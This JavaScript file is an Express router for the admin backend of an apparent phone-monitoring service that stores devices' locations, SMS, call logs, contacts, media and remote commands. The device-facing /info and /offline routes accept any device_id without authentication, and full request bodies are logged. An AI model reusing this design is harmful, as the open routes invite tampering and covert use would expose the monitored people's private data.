const express = require('express');
const { Op } = require('sequelize');
const { Device, Location, MediaFile, Contact, SMS, CallLog, DeviceInfo, Command } = require('../config/database');
const { authenticateToken, authenticateDevice, requireAdmin } = require('../middleware/auth');
const logger = require('../utils/logger');

const router = express.Router();

// Log all device requests
const logRequest = (req, res, next) => {
  const requestId = req.requestId || 'unknown';
  logger.info(`[${requestId}] Devices API: ${req.method} ${req.originalUrl}`);
  if (Object.keys(req.body).length > 0) {
    logger.debug(`[${requestId}] Request body:`, JSON.stringify(req.body, null, 2));
  }
  next();
};

// Apply logging middleware to all routes
router.use([
  express.json({ limit: '10mb' }),
  express.urlencoded({ extended: true, limit: '10mb' }),
  logRequest
]);

const debug = (...args) => console.log('[DEVICES]', ...args);
debug('Devices route loaded');

function normalizeDevice(plain) {
  // accept plain object from Sequelize or raw object
  const devicePlain = plain || {};
  const normalized = {
    id: devicePlain.id,
    // camelCase primary fields (preferred)
    deviceId: devicePlain.deviceId || devicePlain.device_id || devicePlain.deviceId,
    name: devicePlain.name || devicePlain.device_name || null,
    nickname: devicePlain.nickname || null,
    status: devicePlain.status || (devicePlain.isOnline ? 'online' : 'offline'),
    lastSeen: devicePlain.lastSeen || devicePlain.last_seen || null,
    // keep original fields for backwards compatibility
    device_id: devicePlain.device_id || devicePlain.deviceId || null,
    device_name: devicePlain.device_name || devicePlain.name || null,
    last_seen: devicePlain.last_seen || devicePlain.lastSeen || null,
    // spread extra fields so UI can access them if needed
    ...devicePlain
  };
  return normalized;
}

// GET /api/devices  (Admin)
router.get('/', authenticateToken, requireAdmin, async (req, res) => {
  const requestId = req.requestId || 'unknown';
  try {
    logger.info(`[${requestId}] Fetching devices list`);
    const { page = 1, limit = 20, status, search } = req.query;
    const offset = (page - 1) * limit;
    
    logger.info(`[${requestId}] Fetching devices - Page: ${page}, Limit: ${limit}, Status: ${status || 'all'}, Search: ${search || 'none'}`);

    const whereClause = {};
    if (status) whereClause.status = status;
    if (search) {
      whereClause[Op.or] = [
        { device_name: { [Op.like]: `%${search}%` } },
        { device_id: { [Op.like]: `%${search}%` } },
        { model: { [Op.like]: `%${search}%` } },
        { manufacturer: { [Op.like]: `%${search}%` } }
      ];
    }

    logger.info(`[${requestId}] Querying database for devices`);
    
    // First, check if we can connect to the database
    try {
      await Device.sequelize.authenticate();
    } catch (dbErr) {
      logger.error(`[${requestId}] DB connect error`, dbErr);
      return res.status(500).json({ success: false, error: 'Database connection error' });
    }

    const result = await Device.findAndCountAll({
      where: whereClause,
      limit: parseInt(limit),
      offset: parseInt(offset),
      order: [['last_seen', 'DESC']],
      include: [{ model: DeviceInfo, as: 'deviceInfo', required: false }]
    });

    const count = result.count || 0;
    const devices = (result.rows || []).map(d => normalizeDevice(d.get ? d.get({ plain: true }) : d));

    res.json({
      success: true,
      data: devices,         // <-- AdminPanel expects an array (or will use response.data)
      pagination: {
        current_page: parseInt(page),
        total_pages: Math.ceil(count / limit),
        total_items: count
      }
    });
  } catch (error) {
    logger.error(`[${requestId}] Error fetching devices:`, error);
    res.status(500).json({ success: false, error: 'Internal server error', message: error.message });
  }
});

// GET /api/devices/:deviceId  (Admin)
router.get('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  const requestId = req.requestId || 'unknown';
  try {
    const device = await Device.findByPk(req.params.deviceId, {
      include: [
        { model: DeviceInfo, as: 'deviceInfo' },
        { model: Location, as: 'locations', limit: 10, order: [['timestamp', 'DESC']] },
        { model: Command, as: 'commands', limit: 20, order: [['created_at', 'DESC']] }
      ]
    });

    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    const normalized = normalizeDevice(devicePlain);

    res.json({ success: true, data: normalized });
  } catch (error) {
    logger.error(`[${requestId}] Error fetching device:`, error);
    res.status(500).json({ success: false, error: 'Failed to fetch device', message: error.message });
  }
});

// Update device (Admin)
router.put('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const allowedUpdates = ['device_name', 'is_active', 'notes', 'nickname', 'name'];
    const updates = {};
    Object.keys(req.body).forEach(key => { if (allowedUpdates.includes(key)) updates[key] = req.body[key]; });

    await device.update(updates);
    logger.info(`Device updated by admin: ${device.device_id || device.deviceId}`);

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    res.json({ success: true, data: normalizeDevice(devicePlain) });
  } catch (error) {
    logger.error('Update device error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Update device nickname (Admin)
router.put('/:deviceId/nickname', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { nickname } = req.body;
    if (nickname !== undefined && typeof nickname !== 'string') return res.status(400).json({ success: false, error: 'Nickname must be a string' });

    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    await device.update({ nickname: nickname || null });
    logger.info(`Device nickname updated by admin: ${device.device_id || device.deviceId}`);

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    res.json({ success: true, message: 'Device nickname updated successfully', data: { device: normalizeDevice(devicePlain) } });
  } catch (error) {
    logger.error('Update device nickname error:', error);
    res.status(500).json({ success: false, error: 'Server error', message: error.message });
  }
});

// Delete device (Admin)
router.delete('/:deviceId', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    await device.destroy();
    logger.info(`Device deleted by admin: ${device.device_id || device.deviceId}`);

    res.json({ success: true, message: 'Device deleted successfully' });
  } catch (error) {
    logger.error('Delete device error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Device stats, info endpoints (kept original, but normalize outputs where appropriate)
router.get('/:deviceId/stats', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const device = await Device.findByPk(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const [
      locationCount,
      mediaCount,
      contactCount,
      smsCount,
      callLogCount,
      commandCount
    ] = await Promise.all([
      Location.count({ where: { device_id: device.id } }),
      MediaFile.count({ where: { device_id: device.id } }),
      Contact.count({ where: { device_id: device.id } }),
      SMS.count({ where: { device_id: device.id } }),
      CallLog.count({ where: { device_id: device.id } }),
      Command.count({ where: { device_id: device.id } })
    ]);

    const recentActivity = await Location.findAll({ where: { device_id: device.id }, limit: 5, order: [['timestamp', 'DESC']] });

    res.json({
      success: true,
      data: {
        statistics: {
          locations: locationCount,
          media_files: mediaCount,
          contacts: contactCount,
          sms_messages: smsCount,
          call_logs: callLogCount,
          commands: commandCount
        },
        recent_activity: recentActivity
      }
    });
  } catch (error) {
    logger.error('Get device stats error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Device info update (from device)
router.post('/info', async (req, res) => {
  try {
    const deviceIdHeader = req.body.device_id || req.body.deviceId || req.headers['x-device-id'];
    const device = await Device.findOne({ where: { device_id: deviceIdHeader } });
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    const {
      hardware_info,
      software_info,
      network_info,
      security_info,
      installed_apps,
      system_settings,
      permissions,
      sensors
    } = req.body;

    let deviceInfo = await DeviceInfo.findOne({ where: { device_id: device.id } });

    if (deviceInfo) {
      await deviceInfo.update({
        hardware_info, software_info, network_info, security_info,
        installed_apps, system_settings, permissions, sensors, last_updated: new Date()
      });
    } else {
      deviceInfo = await DeviceInfo.create({
        device_id: device.id, hardware_info, software_info, network_info, security_info,
        installed_apps, system_settings, permissions, sensors
      });
    }

    logger.info(`Device info updated: ${deviceIdHeader}`);

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    const emitted = { device_id: devicePlain.device_id || devicePlain.deviceId, deviceId: devicePlain.deviceId || devicePlain.device_id, info: deviceInfo.get ? deviceInfo.get({ plain: true }) : deviceInfo };

    if (req.io) {
      try { req.io.to('admin-room').emit('device-info-updated', emitted); } catch (emitErr) { logger.warn('Emit failed for device-info-updated', emitErr); }
    }

    res.json({ success: true, message: 'Device info updated successfully' });
  } catch (error) {
    logger.error('Update device info error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Set device offline (from device)
router.post('/offline', async (req, res) => {
  try {
    const deviceIdHeader = req.body.device_id || req.body.deviceId || req.headers['x-device-id'];
    const device = await Device.findOne({ where: { device_id: deviceIdHeader } });
    if (!device) return res.status(404).json({ success: false, error: 'Device not found' });

    await device.update({ status: 'offline', last_seen: new Date() });

    const devicePlain = device.get ? device.get({ plain: true }) : device;
    const emitted = { device_id: devicePlain.device_id || devicePlain.deviceId, deviceId: devicePlain.deviceId || devicePlain.device_id, last_seen: devicePlain.last_seen || devicePlain.lastSeen || new Date() };

    if (req.io) {
      try { req.io.to('admin-room').emit('device-offline', emitted); } catch (emitErr) { logger.warn('Emit failed for device-offline', emitErr); }
    }

    res.json({ success: true, message: 'Device status updated to offline' });
  } catch (error) {
    logger.error('Set device offline error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

module.exports = router;
